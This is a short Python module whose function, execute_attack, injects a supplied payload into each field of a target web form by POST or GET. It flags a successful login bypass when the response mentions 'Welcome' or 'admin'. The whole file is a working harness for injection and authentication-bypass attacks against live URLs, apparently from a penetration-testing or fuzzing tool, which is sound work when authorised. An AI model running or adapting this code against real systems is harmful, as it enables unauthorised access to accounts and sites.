import requests
from utils.field_discovery import discover_form_fields

def execute_attack(payload, config):
    try:
        url = config['url']
        method = config.get('method', 'POST')
        headers = config.get('headers', {})

        # Discover fields from target form
        if config.get('field_discovery_enabled', False):
            data = discover_form_fields(url)
        else:
            data = config.get('data_template', {}).copy()

        # Try injecting payload into all discovered fields
        for field in data:
            original_value = data[field]
            data[field] = payload

            if method.upper() == 'POST':
                response = requests.post(url, data=data, headers=headers, timeout=10)
            else:
                response = requests.get(url, params=data, headers=headers, timeout=10)

            if response.status_code == 200 and ('Welcome' in response.text or 'admin' in response.text.lower()):
                return {
                    "status": response.status_code,
                    "output": response.text[:300],
                    "bypassed": True,
                    "injected_field": field
                }

            # Reset the field value after test
            data[field] = original_value

        return {
            "status": response.status_code,
            "output": response.text[:300],
            "bypassed": False,
            "injected_field": None
        }

    except Exception as e:
        return {
            "status": "error",
            "output": str(e),
            "bypassed": False,
            "injected_field": None
        }
